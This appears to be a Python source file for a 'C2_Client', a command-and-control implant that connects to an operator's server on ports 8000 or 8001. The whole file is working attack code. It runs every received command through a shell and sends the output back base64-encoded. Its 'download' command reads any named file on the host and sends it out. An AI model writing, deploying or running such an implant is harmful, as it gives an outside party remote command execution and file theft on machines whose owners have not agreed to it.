#!/usr/bin/env python3

import socket, subprocess, time, argparse, base64

parser = argparse.ArgumentParser("C2_Client")
parser.add_argument("-i", "--ip", help="IP address of the C2 server")
args = parser.parse_args()

# ip = input("1")
# ports = [81, 443, 696, 4444, 5555, 7777, 8000]
ports = [8000, 8001]


def base64_encode(data):
    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string

    Args:
        data (_type_:bytes): The data to encode

    Returns:
        _type_: bytes
    """
    
    delim = b'!!#@'
    if len(data) % 4 != 0:
        data += b'=' * (4 - (len(data) % 4))
    return base64.b64encode(data) + delim

def send_file(socket, file_name):
    """This function sends a file to the C2 server

    Args:
        socket (_type_): The socket to send data to
        file_name (_type_): The name of the file to send
    """
    try:
        with open(file_name, "rb") as f:
            data = f.read()
            data = base64_encode(data)
            socket.sendall(data)
    except:
        socket.sendall(base64_encode(b"[-] File not found"))

def server_connection(ip, ports):
    """This function creates a socket and connects to the C2 server

    Args:
        ip (_type_:str): The IP address of the C2 server
        ports (_type_:list): A list of ports to try to connect to
    """
    # Create socket 
    # print(ip)
    c2_bot = socket.socket()
    # Attempt a connection to the target
    running = True
    # Uncomment below block to continuously attempt to connect to the C2 server
    # while running:
    for port in ports:
        try:
            c2_bot.connect((ip, port))
            print(f"Connected on port {port}")
            while True:
                command = (c2_bot.recv(4096)).decode()
                file_name = ""
                # print(command)
                if command.lower() == "quit":
                    running = False
                    break
                if "download" in command:
                    file_name = command.split(" ")[1]
                    command = command.split(" ")[0]
                    # print(file_name)
                    # try:
                    #     with open(file_name, "rb") as f:
                    #         data = f.read()
                    #         data = base64_encode(data)
                    #         c2_bot.sendall(data)
                    # except:
                    #     c2_bot.sendall(base64_encode(b"[-] File not found"))
                    send_file(c2_bot, file_name)
                else:
                    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    # result = proc.stdout.read() + proc.stderr.read()
                    return_code = result.returncode
                    c2_bot.sendall(base64_encode(result.stdout))
                    # c2_bot.sendall(b'')
            break
        except:
            print(f"Connection failed on port {port}")
            time.sleep(1)
    c2_bot.close()
    exit()

server_connection(args.ip, ports)